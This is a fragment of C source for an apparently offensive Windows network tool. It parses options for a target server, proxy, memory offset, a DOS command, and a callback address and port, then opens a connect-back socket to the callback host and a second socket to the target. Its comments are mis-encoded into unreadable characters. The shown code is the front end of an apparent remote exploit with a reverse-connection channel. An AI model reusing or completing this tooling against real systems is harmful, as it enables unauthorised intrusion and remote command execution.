
void usage ( char *arg )
{
    outprintf("\r\nUsage: %s [-h] [-s server] [-p port] [-c callback_address] [-o callback_port]\r\n[-u urlfile] [-r proxy] [-f file] [-t offset] [-d doscmd] [-v system_version]\r\n",arg );
    exit( EXIT_FAILURE );
}  /* end of usage */


void  getvar(int argc, char **argv)
{
	unsigned int i;
	WSADATA wsaData;
    int result;
    struct  sockaddr_in s_in;
    struct  hostent *he;
    int     fd;
    u_short port=WEBPORT;
	SOCKET  d_ip;

	exp_name=argv[0];
    for(i=strlen(exp_name);i>0;--i)
	{
	   if(*(char *)(exp_name+i)=='\\')
       {
		   exp_name=exp_name+i+1;
		   break;
	   }
	}

	for ( i = 1; i < argc; i++ )
    {
        /*
         * ͬʱ֧��-��/�������������в����ķ�ʽ
         */
        if ( ( argv[i][0] == '-' ) || ( argv[i][0] == '/' ) )
        {
            /*
             * ������ֽ��ϣ���Сд������
             */
            switch ( tolower( argv[i][1] ) )
            {
            case 's':
                /*
                 * �����ַ
                 */
                server = argv[++i];
                break;

            case 'p':
                /*
                 * ����˿�
                 */
                s_port = argv[++i];
                break;
            case 'c':
                /*
                 * ������ַ
                 */
                callback_address   = argv[++i];
                break;
            case 'o':
                /*
                 * �����˿�
                 */
                callback_port          = argv[++i];
                break;
			case 'u':
                /*
                 * ��ҳ�ļ�����
                 */
                urlfile                 = argv[++i];
                break;
			case 'f':
                /*
                 * �ļ���
                 */
                file                 = argv[++i];
                break;

            case 'v':
                /*
                 * ϵͳ�汾
                 */
                version                 = argv[++i];
                break;
            case 't':
                /*
                 * �����ƫ��
                 */
                offsetstr               = argv[++i];
				if(offsetstr!=NULL)   offset=atoi(offsetstr);
                break;

            case 'r':
                /*
                 * �����ַ
                 */
                proxy                   = argv[++i];
                break;
            case 'd':
                /*
                 * DOS����
                 */
                doscmd                   = argv[++i];
                break;
			case 'h':
            case '?':
            default:
                usage( argv[0] );
            }  /* end of switch */
        }
        else
        {
            usage( argv[0] );
        }
    }  /* end of for */

	if(server==NULL) usage( argv[0] );
    

	result= WSAStartup(MAKEWORD(1, 1), &wsaData);
    if (result != 0) {
		strout("Your computer was not connected "
			"to the Internet at the time that "
			"this program was launched, or you "
			"do not have a 32-bit "
			"connection to the Internet.");
		exit(1);
	}
    if(callback_address!=NULL){

       d_ip = inet_addr(callback_address);
       if(d_ip==-1)
	   {
          he = gethostbyname(callback_address);
          if(!he)
		  {
            WSACleanup( );
	        outprintf("\r\nCan't get the ip of %s !\r\n",server);
	        exit(1);	 
		  }
	      else    memcpy(&d_ip, he->h_addr, 4);
	   }	 

	   port=CALLBACK_PORT;
       if(callback_port!=NULL) port=atoi(callback_port);
       if(port==0) port=CALLBACK_PORT;

       fd = socket(AF_INET, SOCK_STREAM,0);
  i=TIMEOUT;
  setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,(const char *) &i,sizeof(i));
  	  
       s_in.sin_family = AF_INET;
       s_in.sin_port = htons(port);
       s_in.sin_addr.s_addr = d_ip;
   
       if(connect(fd, (struct sockaddr *)&s_in, sizeof(struct sockaddr_in))!=0)
	   {		
	      closesocket(fd);
	      WSACleanup( );
	      outprintf("\r\nConnect %s err!\r\n",callback_address);
	      exit(1);
	   }
	   else  callback_socket=fd;
	      
	}

	 for(i=0;i<strlen(server);++i)
	 {
        if(server[i]!=' ')    break;
	 }
     if(i<strlen(server)) server+=i;

     for(i=0;i+3<strlen(server);++i){
	  
	  if(server[i]==':'){
		  if(server[i+1]=='\\'||server[i+1]=='/'){
			  if(server[i+2]=='\\'||server[i+2]=='/'){
				  server+=i;
				  server+=3;
		          break;
			  }
		  }
	  }
  }
  for(i=1;i<=strlen(server);++i){
	  if(server[i-1]=='\\'||server[i-1]=='/') server[i-1]=0;
  }
 
  if(proxy!=NULL) d_ip=inet_addr(proxy);
  else            d_ip = inet_addr(server);
  if(d_ip==-1)
  {
     if(proxy!=NULL) he = gethostbyname(proxy);
     else            he = gethostbyname(server);
     if(!he)
     {
       WSACleanup( );
	   outprintf("\r\nCan't get the ip of %s !\r\n",server);
	   exit(1);	 
	 }
	 else    memcpy(&d_ip, he->h_addr, 4);
  }	 
       if(s_port!=NULL) port=atoi(s_port);
       if(port<=0) port=WEBPORT;

       fd = socket(AF_INET, SOCK_STREAM,0);
  i=TIMEOUT;
  setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,(const char *) &i,sizeof(i));
  	  
       s_in.sin_family = AF_INET;
       s_in.sin_port = htons(port);
       s_in.sin_addr.s_addr = d_ip;
   
       if(connect(fd, (struct sockaddr *)&s_in, sizeof(struct sockaddr_in))!=0)
	   {		
	      closesocket(fd);
	      WSACleanup( );
	      outprintf("\r\nConnect %s err!\r\n",server);
	      exit(1);
	   }
	   else  server_socket=fd;
	  
	   printinfo();

 }








//***********************************************************************************




